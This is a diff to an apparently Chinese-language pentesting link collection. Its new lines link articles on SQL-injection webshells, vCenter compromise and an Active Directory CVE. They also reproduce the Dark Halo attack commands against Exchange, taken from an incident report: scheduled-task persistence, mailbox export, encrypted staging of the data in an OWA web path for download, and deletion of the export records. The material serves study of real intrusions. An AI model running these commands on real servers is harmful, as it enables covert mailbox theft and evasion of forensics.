@@ -60,16 +60,55 @@ https://afinepl.medium.com/testing-and-exploiting-java-deserialization-in-2021-e
 - [COBALTSTIRKE BOF技术剖析（一）](http://blog.nsfocus.net/cobaltstirke-bof/)
 > 内存中不落地执行，避免针对文件内容的检测，在本进程加载执行BOF中的功能代码。
 
+- [MYSQL存在注入点，写WEBSHELL的5种方式](https://manning23.github.io/2019/07/23/MYSQL%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E5%86%99WebShell%E7%9A%845%E7%A7%8D%E6%96%B9%E5%BC%8F/)
+
+- [红蓝对抗之隐蔽通信应用及防御](https://mp.weixin.qq.com/s/huDegnt6oMg-drOB0SyZfg)
+
+- [Compromising vCenter via SAML Certificates](https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/)
+> 通过读取data.mdb中的证书，通过证书请求获取管理员cookie
+
+- [Public Pentest reports](https://pentestreports.com/reports/)
+> 国外公开渗透测试报告模板
+
+- [Serverless 扫描技术研究及应用](https://paper.seebug.org/1776/)
+
+- [CVE-2021-42287/CVE-2021-42278 漏洞复现](https://www.yuque.com/0xcccccccc/vul/wean9o?)
 
 
+## 内网渗透
 
-
-
-
-
-
-
-
+- [dark-halo-leverages-solarwinds-compromise-to-breach-organizations](https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/)
+```bash
+使用Get-ManagementRoleAssignment获取用户列表
+C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-ManagementRoleAssignment -GetEffectiveUsers | select Name,Role,EffectiveUserName,AssignmentMethod,IsValid | ConvertTo-Csv -NoTypeInformation | % {$_ -replace ‘`n’,’_’} | Out-File C:\temp\1.xml"
+ 
+获取虚拟目录配置信息
+C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-WebServicesVirtualDirectory | Format-List"
+ 
+查询组织管理成员，sqlceip.exe其实是ADFind.exe
+C:\Windows\system32\cmd.exe /C sqlceip.exe -default -f (name="Organization Management") member -list | sqlceip.exe -f objectcategory=* > .\SettingSync\log2.txt
+ 
+创建计划任务
+$scheduler = New-Object -ComObject ("Schedule.Service");$scheduler.Connect($env:COMPUTERNAME);$folder = $scheduler.GetFolder("\Microsoft\Windows\SoftwareProtectionPlatform");$task = $folder.GetTask(“EventCacheManager”);$definition = $task.Definition;$definition.Settings.ExecutionTimeLimit = “PT0S”;$folder.RegisterTaskDefinition($task.Name,$definition,6,”System”,$null,5);echo “Done”
+ 
+C:\Windows\system32\cmd.exe /C schtasks /create /F /tn “\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager” /tr “C:\Windows\SoftwareDistribution\EventCacheManager.exe” /sc ONSTART /ru system /S [machine_name] 
+ 
+密取数据：
+使用New-MailboxExportRequest 和 Get-MailboxExport-Request 命令从邮箱中窃取数据
+C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command “New-MailboxExportRequest -Mailbox foobar@organization.here -ContentFilter {(Received -ge ’03/01/2020′)} -FilePath ‘\\<MAILSERVER>\c$\temp\b.pst'”
+ 
+7z打包加密
+C:\Windows\system32\cmd.exe /C .\7z.exe a -mx9 -r0 -p[33_char_password]  “C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Redir.png” C:\Temp\b.pst
+ 
+https://owa.organization.here/owa/auth/Redir.png
+\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\
+ 
+同步邮件
+C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command “Set-CASMailbox -Identity <UserID> -ActiveSyncAllowedDeviceIDs @{add=’XXXXXXXXXXXXX’}"
+ 
+清除记录：
+C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-MailboxExportRequest -Mailbox user@organization.here | Remove-MailboxExportRequest -Confirm:$False"
+```
 
 
 
